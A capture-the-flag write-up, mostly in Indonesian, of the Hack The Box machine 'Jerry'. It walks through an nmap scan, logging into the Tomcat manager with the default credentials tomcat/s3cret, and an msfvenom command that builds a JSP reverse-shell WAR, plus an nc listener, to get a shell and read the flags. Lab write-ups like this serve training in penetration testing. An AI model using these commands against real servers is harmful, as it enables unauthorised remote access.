Although Jerry is one of the easier machines on Hack The Box, it is realistic as Apache Tomcat is often found exposed and configured with common or weak credentials.

![Pasted image 20241202025212](https://github.com/user-attachments/assets/5aa7defb-4229-4ebf-9645-ef3e51d75c2f)

Seperti biasa pertama lakukan port scanning.
```
❯ nmap -sC -sV -T3 10.10.10.95 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2024-12-02 00:17 WIB
Nmap scan report for 10.10.10.95
Host is up (0.066s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.57 seconds
```

Dari hasil port scanning, kita dapatkan informasi bahwa hanya ada 1 port yang terbuka yaitu port 8080 dengan service Apache Tomcat versi 7.0.88.
![Pasted image 20241202002138](https://github.com/user-attachments/assets/a3a9abb4-b996-453f-b0b1-385454b84751)



Ketika button ‘Manager App’ diklik akan meminta username dan password seperti gambar di bawah ini.

![Pasted image 20241202002156](https://github.com/user-attachments/assets/1bd2dbc7-7389-4df2-90ac-f45bca8ca601)


Dan apabila memasukkan kredensial yang salah maka membuka page /manager/html seperti berikut.

![Pasted image 20241202002518](https://github.com/user-attachments/assets/352c2e7d-3ee5-44fa-a03b-9bb4f1b569f7)


Dari /manager/html kita dapatkan kredensial user.
`Username : tomcat`
`Password : s3cret`

Login kembali dengan kredensial di atas maka akan terbuka page berikut.

![Pasted image 20241202023301](https://github.com/user-attachments/assets/33d5fb67-f11e-41a3-adaf-6c04dbfad02b)
![Pasted image 20241202023342](https://github.com/user-attachments/assets/0514122a-6dc6-4967-bfe9-3733f60c406f)


Dari sini, kita ketahui bahwasanya web ini menerima .WAR file, WAR file (Web Application Resource atau Web application ARchive) merupakan sebuah file yang digunakan untuk mendistribusikan kumpulan JAR-files, JavaServer Pages, Java Servlets, Java classes, XML files, tag libraries, static web pages (HTML dan sejenisnya) ke dalam suatu web.

Untuk exploitnya, bisa kita ikuti [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat), bisa menggunakan metasploit atau manual dengan msfvenom, kali ini saya akan menggunakan msfvenom agar sekalian belajar. Jangan lupa sesuaikan LHOST dan LPORT sesuai dengan IP dan Port listenernya. IPnya bisa dilihat dengan command ip a di bagian tun0 dan portnya bebas.

![Pasted image 20241202024917](https://github.com/user-attachments/assets/4a13fa38-1f25-4c8f-8334-a05ab636f89f)

Berikut command msfvenomnya untuk menghasilkan revshell.
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST_IP> LPORT=<LPORT> -f war -o revshell.war
```

Setelah itu jalankan listener dengan command `nc -lvnp <port>` sesuaikan port dengan port listenernya, lalu upload file revshell.war pada menu deploy di /manager/html tadi, setelah berhasil terupload akan seperti ini, ![[Pasted image 20241202024145.png]]

Buka tabnya dan listener akan mendapatkan koneksi.

![Pasted image 20241202024252](https://github.com/user-attachments/assets/f6b0f59d-c6d7-4539-a393-049fe28b0a99)

Setelah itu cari lokasi flag user.txt dan root.txt.
```
cd ..\Users\Administrator\Dekstop\flags
```

Di dalam folder flags terdapat file yang bernama 2 for the price of 1.txt, untuk printnya bisa gunakan command type seperti gambar di bawah

![Pasted image 20241202024624](https://github.com/user-attachments/assets/adad957d-3ce0-46c5-bd14-4b48e2bcd7dc)

Dan voila kita dapatkan flag user dan rootnya.
